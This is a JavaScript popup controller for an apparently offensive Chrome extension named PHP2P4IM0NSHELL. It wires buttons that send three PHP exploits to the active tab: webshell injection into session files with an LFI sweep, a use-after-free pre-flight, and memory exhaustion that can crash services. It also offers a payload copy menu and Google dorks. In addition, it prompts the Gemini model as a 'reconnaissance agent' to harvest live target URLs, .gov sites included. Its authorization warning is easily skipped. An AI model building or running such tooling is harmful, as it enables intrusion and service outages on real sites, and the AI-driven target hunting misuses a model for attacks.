// PHP2P4IM0NSHELL - Controlador de Interfaz (UI) v1.1
// Autor: P4IM0N

document.addEventListener('DOMContentLoaded', () => {

    const $ = (id) => document.getElementById(id);

    const ui = {
        insigniaPasiva:      $('insignia-pasiva'),
        insigniaVersion:     $('insignia-version'),
        insigniaRiesgo:      $('insignia-riesgo'),
        listaPasiva:         $('lista-pasiva'),
        objetivoHost:        $('objetivo-host'),
        btnReset:            $('btnReset'),
        btnHuella:           $('btnHuella'),
        resultadoHuella:     $('resultado-huella'),
        listaActiva:         $('lista-activa'),
        btnExploit:          $('btnExploit'),
        entradaComando:      $('entradaComando'),
        estadoExploit:       $('estado-exploit'),
        resultadoExploit:    $('resultado-exploit'),
        salidaRce:           $('salida-rce'),
        selectorExploit:     $('selectorExploit'),
        cveInfoText:         $('cve-info-text'),
        cajaHandoff:         $('caja-handoff'),
        cmdHandoff:          $('cmd-handoff'),
        btnCopiarHandoff:    $('btnCopiarHandoff'),
        listaPreflight:      $('lista-preflight'),
        rutaSesion:          $('rutaSesion'),
        tabs:                document.querySelectorAll('.nav-tab'),
        vistas:              document.querySelectorAll('.vista-panel'),
        geminiToken:         $('geminiToken'),
        btnCazar:            $('btnCazar'),
        btnShodan:           $('btnShodan'),
        selectorDork:        $('selectorDork'),
        listaIps:            $('lista-ips'),
        btnAbrirTerminal:    $('btnAbrirTerminal'),
        btnCerrarTerminal:   $('btnCerrarTerminal'),
        placeholderTerminal: $('placeholder-terminal'),
        btnPayloads:         $('btnPayloads'),
        menuPayloads:        $('menuPayloads'),
        itemsPayload:        document.querySelectorAll('.payload-item')
    };

    if (ui.estadoExploit) { ui.estadoExploit.style.display = 'none'; }

    const DESCRIPCIONES = {
        'CVE-2026-109619':
            'Inyeccion de la key de sesion via PHP_SESSION_UPLOAD_PROGRESS: la webshell queda escrita en /tmp/sess_<id>. ' +
            'Despues se barren parametros de inclusion (LFI) y, si aparece, se ejecuta el comando de verdad. ' +
            'Solo declara exito con el marcador de output en la respuesta.',
        'CVE-2026-109618':
            'Heap UAF en upload progress -> fake HashTable -> zif_system(). Necesita 4 stages sobre sockets crudos, ' +
            'imposibles desde fetch(). Este modulo hace el pre-flight real (version, upload_progress, display_errors, ' +
            'bypass de WAF) y entrega el comando calibrado del PoC. Comando inline maximo: 14 bytes.',
        'CVE-2026-10961x':
            'Amplificacion 52x con cabeceras duplicadas de 6 bytes. fetch() no puede duplicar cabeceras, asi que la ' +
            'extension ejecuta una escalera OOM (2/8/32 MB) que revela el memory_limit y el post_max_size reales. ' +
            'El 52x se lanza con el PoC; aqui se confirma la superficie.'
    };

    function aplicarModo() {
        const sel = ui.selectorExploit.value;
        const esUaf = sel === 'CVE-2026-109618';
        ui.cveInfoText.innerText = DESCRIPCIONES[sel] || '';
        ui.cajaHandoff.style.display = esUaf ? 'block' : 'none';
        ui.entradaComando.maxLength = esUaf ? 14 : 400;
        ui.entradaComando.placeholder = esUaf ? 'id>/tmp/p1 (max 14 B)' : 'id; uname -a; pwd';
        if (esUaf) {
            ui.entradaComando.value = ui.entradaComando.value.slice(0, 14);
        }
        ui.btnExploit.innerText = esUaf ? 'PRE-FLIGHT + HANDOFF' : 'EJECUTAR';
    }

    // Un "/tmp" guardado de una version anterior no sirve para un lab que
    // publica otra ruta: el motor manda con lo que lea de /health.php.
    const rutaGuardada = (localStorage.getItem('p4im0n_php_save_path') || '').trim();
    ui.rutaSesion.value = (!rutaGuardada || rutaGuardada === '/tmp') ? 'data/sessions' : rutaGuardada;
    ui.rutaSesion.addEventListener('change', () => {
        localStorage.setItem('p4im0n_php_save_path', ui.rutaSesion.value.trim());
    });

    ui.selectorExploit.addEventListener('change', aplicarModo);
    aplicarModo();

    // =============================================
    // TERMINAL ALPINE v86 (SLIDE LEFT)
    // =============================================
    let terminalCargada = false;

    ui.btnAbrirTerminal.addEventListener('click', () => {
        document.body.classList.add('modo-terminal');
        if (!terminalCargada) {
            const cb = new Date().getTime();
            ui.placeholderTerminal.innerHTML =
                '<iframe src="https://bellard.org/jslinux/vm.html?cpu=x86&url=https://bellard.org/jslinux/alpine-x86.cfg&mem=192&t=' + cb + '"' +
                ' class="terminal-iframe" allow="fullscreen; clipboard-read; clipboard-write"' +
                ' sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-modals"></iframe>';
            terminalCargada = true;
        }
    });

    ui.btnCerrarTerminal.addEventListener('click', () => {
        document.body.classList.remove('modo-terminal');
    });

    // =============================================
    // PAYLOADS
    // =============================================
    ui.btnPayloads.addEventListener('click', (e) => {
        e.stopPropagation();
        ui.menuPayloads.style.display = (ui.menuPayloads.style.display === 'block') ? 'none' : 'block';
    });

    ui.itemsPayload.forEach((item) => {
        item.addEventListener('click', () => {
            const codigo = item.getAttribute('data-code') || '';
            navigator.clipboard.writeText(codigo).then(() => {
                const original = item.innerText;
                item.innerText = 'COPIADO!';
                item.style.color = '#00ff41';
                setTimeout(() => {
                    item.innerText = original;
                    item.style.color = '';
                    ui.menuPayloads.style.display = 'none';
                }, 900);
            }).catch(() => {
                ui.entradaComando.value = codigo.slice(0, ui.entradaComando.maxLength || 400);
            });
        });
    });

    document.addEventListener('click', (e) => {
        if (ui.menuPayloads && !ui.menuPayloads.contains(e.target) && e.target !== ui.btnPayloads) {
            ui.menuPayloads.style.display = 'none';
        }
    });

    // =============================================
    // NAV TABS
    // =============================================
    ui.tabs.forEach((tab) => {
        tab.addEventListener('click', () => {
            ui.tabs.forEach((t) => t.classList.remove('activo'));
            ui.vistas.forEach((v) => { v.style.display = 'none'; });
            tab.classList.add('activo');
            const destino = $(tab.getAttribute('data-target'));
            if (destino) { destino.style.display = 'block'; }
        });
    });

    // =============================================
    // RECON: token guardado, Shodan y dorks
    // =============================================
    const tokenGuardado = localStorage.getItem('p4im0n_php_gemini_token');
    if (tokenGuardado) { ui.geminiToken.value = tokenGuardado; }

    ui.btnShodan.addEventListener('click', () => {
        chrome.tabs.create({ url: 'https://www.shodan.io/search?query=http.component%3APHP+http.server%3AApache+200' });
    });

    const DORKS = {
        'php_apache_exposed': 'inurl:"index.php" "X-Powered-By: PHP" -site:github.com -site:stackoverflow.com',
        'php_wordpress':      'inurl:"/wp-login.php" -site:github.com -site:wordpress.com',
        'php_legacy_eol':     '"PHP/7." OR "PHP/8.0" OR "PHP/8.1" inurl:"index.php" -site:github.com',
        'php_fpm_upload':     'intext:"session.upload_progress" filetype:php -site:github.com',
        'php_magento':        'inurl:"/index.php/admin" OR inurl:"/admin/index.php" "Magento" -site:github.com'
    };

    function pintarObjetivos(lista) {
        ui.listaIps.innerHTML = '';
        if (!lista.length) {
            ui.listaIps.innerHTML = "<div class='mensaje-espera'>Sin resultados limpios. Prueba otro dork.</div>";
            return;
        }
        lista.forEach((t) => {
            const div = document.createElement('div');
            div.className = 'item-ip';

            const limpia = String(t.url || '').replace(/^https?:\/\//, '').replace(/\/$/, '');
            const corta = limpia.length > 30 ? limpia.slice(0, 27) + '...' : limpia;
            const version = t.php_version || 'unknown';
            const org = String(t.org || '').slice(0, 14);

            const izq = document.createElement('span');
            const addr = document.createElement('span');
            addr.className = 'ip-addr';
            addr.textContent = corta;
            const orgSpan = document.createElement('span');
            orgSpan.style.color = '#666';
            orgSpan.textContent = ' (' + org + ')';
            izq.appendChild(addr);
            izq.appendChild(orgSpan);

            const der = document.createElement('span');
            const ver = document.createElement('span');
            ver.style.cssText = 'color:#ffae00;font-size:9px';
            ver.textContent = '[PHP:' + version + ']';
            const riesgo = document.createElement('span');
            riesgo.className = 'ip-risk';
            riesgo.textContent = ' [' + (t.risk_score || '?') + ']';
            der.appendChild(ver);
            der.appendChild(riesgo);

            div.appendChild(izq);
            div.appendChild(der);
            div.title = 'Click para copiar: ' + (t.url || '');
            div.addEventListener('click', () => {
                navigator.clipboard.writeText(t.url || '');
                div.style.background = '#003b00';
                setTimeout(() => { div.style.background = ''; }, 200);
            });
            ui.listaIps.appendChild(div);
        });
    }

    ui.btnCazar.addEventListener('click', async () => {
        const clave = ui.geminiToken.value.trim();
        const dork = DORKS[ui.selectorDork.value] || 'inurl:"index.php" "PHP"';

        if (!clave) {
            ui.listaIps.innerHTML = "<div style='color:#ff003c'>ERROR: SE REQUIERE GEMINI API TOKEN</div>";
            return;
        }

        localStorage.setItem('p4im0n_php_gemini_token', clave);
        ui.btnCazar.disabled = true;
        ui.btnCazar.innerText = 'GOOGLE NEURAL: CAZANDO...';
        ui.listaIps.innerHTML = "<div class='mensaje-espera'>EJECUTANDO DORK:<br>" + dork + '<br>ESCANEANDO INDICE GLOBAL PHP...</div>';

        const prompt = [
            'ROLE: Cyber Reconnaissance Agent specializing in PHP vulnerability research.',
            "MISSION: Execute a Google Search for: '" + dork + "'.",
            'OBJECTIVE: Extract exactly 10 distinct, live URLs of PHP web applications from the results.',
            'CONSTRAINTS:',
            '1. Ignore code repositories (GitHub, GitLab) and forums (StackOverflow, Reddit).',
            '2. Focus on live PHP deployments (.com, .io, .app, .net, .org, .gov).',
            '3. Prioritize sites likely running Apache + mod_php with session.upload_progress enabled.',
            '4. RETURN ONLY RAW JSON, no markdown, no explanation.',
            'OUTPUT FORMAT (JSON array only):',
            '[{"url":"https://found-target.com","org":"Site Title","php_version":"unknown","risk_score":"HIGH"}]'
        ].join('\n');

        try {
            const url = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=' + encodeURIComponent(clave);
            const resp = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    contents: [{ parts: [{ text: prompt }] }],
                    tools: [{ google_search: {} }]
                })
            });

            const texto = await resp.text();
            let datos;
            try {
                datos = JSON.parse(texto);
            } catch (e) {
                throw new Error('Respuesta no JSON (HTTP ' + resp.status + ')');
            }
            if (!resp.ok) {
                throw new Error((datos.error && datos.error.message) || ('HTTP ' + resp.status));
            }

            const partes = datos.candidates && datos.candidates[0] && datos.candidates[0].content &&
                datos.candidates[0].content.parts;
            const bruto = partes && partes[0] && partes[0].text;
            if (!bruto) { throw new Error('La IA no devolvio datos legibles.'); }

            const bloque = bruto.match(/\[[\s\S]*\]/);
            if (!bloque) { throw new Error('Sin objetivos estructurados en la respuesta.'); }

            pintarObjetivos(JSON.parse(bloque[0]));
        } catch (e) {
            ui.listaIps.innerHTML = "<div style='color:#ff003c;font-size:10px;padding:5px;'>FALLO DE MISION:<br>" +
                e.message + '<br><br>Tip: revisa el token o prueba otro dork.</div>';
        } finally {
            ui.btnCazar.disabled = false;
            ui.btnCazar.innerText = 'EJECUTAR GOOGLE DORKING';
        }
    });

    // =============================================
    // CMD CENTER: puente con content.js
    // =============================================
    let idPestana = null;

    function mostrarSalida(texto, ok) {
        ui.resultadoExploit.style.display = 'block';
        ui.salidaRce.textContent = texto;
        ui.salidaRce.style.color = ok ? '#00cec9' : '#ff8080';
    }

    function pintarPreflight(checks) {
        if (!checks || !ui.listaPreflight) { return; }
        ui.listaPreflight.innerHTML = '';
        checks.forEach((c) => {
            const li = document.createElement('li');
            li.className = c.ok ? 'ok' : 'ko';
            li.textContent = (c.ok ? '[x] ' : '[ ] ') + c.txt;
            li.title = c.detalle || '';
            ui.listaPreflight.appendChild(li);
        });
    }

    function procesarPasivo(r) {
        if (!r || r.error) {
            ui.insigniaPasiva.innerText = 'OFFLINE';
            ui.insigniaPasiva.className = 'insignia-estado';
            ui.listaPasiva.innerHTML = '<li>Sin respuesta del motor: pagina restringida (chrome://, Web Store) o recarga pendiente.</li>';
            return;
        }

        ui.insigniaPasiva.innerText = r.esPhp ? 'PHP DETECTADO' : 'SIN FIRMA PHP';
        ui.insigniaPasiva.className = 'insignia-estado' + (r.esPhp ? ' detectado' : '');

        const ev = r.evaluacion || {};
        ui.insigniaVersion.innerText = r.version || '?';
        ui.insigniaRiesgo.innerText = (ev.estado || 'SIN DATOS') + (ev.riesgo ? ' / ' + ev.riesgo : '');
        ui.insigniaRiesgo.className = 'riesgo' + (/VULNERABLE|EOL/.test(ev.estado || '') ? ' critico' : '');

        // Si el laboratorio publica su save_path, el campo lo refleja.
        if (r.rutaSesion) { ui.rutaSesion.value = r.rutaSesion; }

        ui.listaPasiva.innerHTML = '';
        (r.detalles || []).forEach((d) => {
            const li = document.createElement('li');
            li.textContent = d;
            li.style.color = r.esPhp ? '#ff9d9d' : '#008f11';
            ui.listaPasiva.appendChild(li);
        });
    }

    function iniciarConexion(intento) {
        chrome.tabs.sendMessage(idPestana, { accion: 'obtener_pasivo' }, (respuesta) => {
            if (chrome.runtime.lastError || !respuesta) {
                if (!intento) {
                    ui.insigniaPasiva.innerText = 'INYECTANDO...';
                    chrome.scripting.executeScript({ target: { tabId: idPestana }, files: ['content.js'] }, () => {
                        if (chrome.runtime.lastError) {
                            procesarPasivo({ error: chrome.runtime.lastError.message });
                            return;
                        }
                        setTimeout(() => iniciarConexion(1), 350);
                    });
                    return;
                }
                procesarPasivo({ error: 'sin respuesta' });
                return;
            }
            procesarPasivo(respuesta);
        });
    }

    chrome.tabs.query({ active: true, currentWindow: true }, (pestanas) => {
        if (!pestanas || !pestanas.length) { return; }
        idPestana = pestanas[0].id;
        const url = pestanas[0].url || '';

        try {
            ui.objetivoHost.textContent = new URL(url).host;
        } catch (e) {
            ui.objetivoHost.textContent = 'pagina no http';
        }

        iniciarConexion(0);

        // --- Pide al motor la ruta de sesion que ya conoce del lab ---
        chrome.tabs.sendMessage(idPestana, { accion: 'estado_cache' }, (cache) => {
            if (cache && cache.rutaSesion) {
                ui.rutaSesion.value = cache.rutaSesion;
            }
        });

        // --- SONDA ACTIVA ---
        ui.btnHuella.addEventListener('click', () => {
            ui.btnHuella.disabled = true;
            ui.btnHuella.innerText = 'EJECUTANDO MULTIPART PROBE...';
            ui.resultadoHuella.style.display = 'none';

            chrome.tabs.sendMessage(idPestana, { accion: 'ejecutar_huella' }, (respuesta) => {
                ui.btnHuella.disabled = false;
                ui.btnHuella.innerText = 'RE-INICIAR MULTIPART PROBE';
                ui.resultadoHuella.style.display = 'block';
                ui.listaActiva.innerHTML = '';

                const detalles = (respuesta && respuesta.detalles) || ['Sin respuesta del motor.'];
                detalles.forEach((d) => {
                    const li = document.createElement('li');
                    li.textContent = d;
                    li.style.color = /^\[\+\]/.test(d) ? '#ffae00' : (/^\[!\]/.test(d) ? '#ff6a00' : '#7a7a7a');
                    ui.listaActiva.appendChild(li);
                });
            });
        });

        // --- EJECUTAR EXPLOIT ---
                ui.btnExploit.addEventListener('click', () => {
            if (!idPestana) {
                mostrarSalida('[ERROR] Sin pestana activa. Abre el objetivo y vuelve a pulsar el icono de la extension.', false);
                return;
            }

            const tipo = ui.selectorExploit.value;
            const cmd = (ui.entradaComando.value || (tipo === 'CVE-2026-109618' ? 'id>/tmp/p1' : 'id')).trim();

            const necesitaConfirmar = (tipo === 'CVE-2026-109619' || tipo === 'CVE-2026-10961x');

            if (necesitaConfirmar && ui.btnExploit.dataset.confirmado !== '1') {
                ui.btnExploit.dataset.confirmado = '1';
                ui.btnExploit.innerText = 'CONFIRMAR ?';
                mostrarSalida([
                    'AVISO', '',
                    (tipo === 'CVE-2026-109619'
                        ? 'Se escribira una webshell en el archivo de sesion del objetivo y se barreran hasta 48 rutas de inclusion (LFI) con un comando real.'
                        : 'Se enviaran cuerpos multipart de 2, 8 y 32 MB: puede agotar la memoria del worker y tumbar el servicio.'),
                    '', 'Solo laboratorios propios o con autorizacion escrita.',
                    'Pulsa CONFIRMAR ? para ejecutar.',
                    '',
                    'Truco para demo rapida: en la siguiente orden ya puedes pulsar directamente EJECUTAR'
                ].join(String.fromCharCode(10)), false);
                return;
            }

            if (necesitaConfirmar && ui.btnExploit.dataset.confirmado === '1') {
                ui.btnExploit.dataset.confirmado = '2';
            }

            ui.btnExploit.innerText = 'EJECUTANDO...';
            aplicarModo();

            ui.btnExploit.disabled = true;
            ui.estadoExploit.style.display = 'block';
            ui.estadoExploit.innerText = tipo === 'CVE-2026-109618'
                ? 'EJECUTANDO PRE-FLIGHT (sonda 4 MB)...'
                : (tipo === 'CVE-2026-10961x' ? 'ENVIANDO ESCALERA OOM...' : 'INYECTANDO SESION Y BARRANDO LFI...');
            ui.resultadoExploit.style.display = 'none';

            chrome.tabs.sendMessage(idPestana, {
                accion: 'ejecutar_exploit',
                tipo: tipo,
                cmd: cmd,
                rutaSesion: (ui.rutaSesion.value || 'data/sessions').trim(),
                confirmar: true
            }, (respuesta) => {
                ui.btnExploit.disabled = false;
                ui.estadoExploit.style.display = 'none';
                ui.btnExploit.innerText = 'EJECUTAR';
                ui.btnExploit.dataset.confirmado = '';

                if (!respuesta) {
                    mostrarSalida('[ERROR] El motor no respondio. Recarga la pagina y reabre el popup.', false);
                    return;
                }

                if (respuesta.handoff) {
                    ui.cmdHandoff.textContent = respuesta.comando || '';
                    pintarPreflight(respuesta.checks);
                    mostrarSalida(respuesta.salida, false);
                    return;
                }

                if (respuesta.exito) {
                    mostrarSalida('[' + tipo + '] CONFIRMADO\n\n' + (respuesta.salida || ''), true);
                    chrome.runtime.sendMessage({ accion: 'actualizar_insignia' });
                } else {
                    mostrarSalida('[' + tipo + '] SIN CONFIRMACION\n\n' + (respuesta.salida || respuesta.msg || 'Sin detalle.'), false);
                }
            });
        });

        // --- COPIAR HANDOFF ---
        ui.btnCopiarHandoff.addEventListener('click', () => {
            const texto = ui.cmdHandoff.textContent || '';
            navigator.clipboard.writeText(texto).then(() => {
                ui.btnCopiarHandoff.innerText = 'COPIADO!';
                setTimeout(() => { ui.btnCopiarHandoff.innerText = 'COPIAR COMANDO'; }, 1200);
            });
        });

        // --- RESET ---
        ui.btnReset.addEventListener('click', () => {
            chrome.tabs.sendMessage(idPestana, { accion: 'resetear_estado' }, () => {
                ui.resultadoHuella.style.display = 'none';
                ui.resultadoExploit.style.display = 'none';
                ui.cajaHandoff.style.display = 'none';
                ui.insigniaVersion.innerText = '?';
                ui.insigniaRiesgo.innerText = 'sin datos';
                ui.insigniaRiesgo.className = 'riesgo';
                mostrarSalida('ESPERANDO ENTRADA...', false);
                iniciarConexion(0);
            });
        });
    });
});
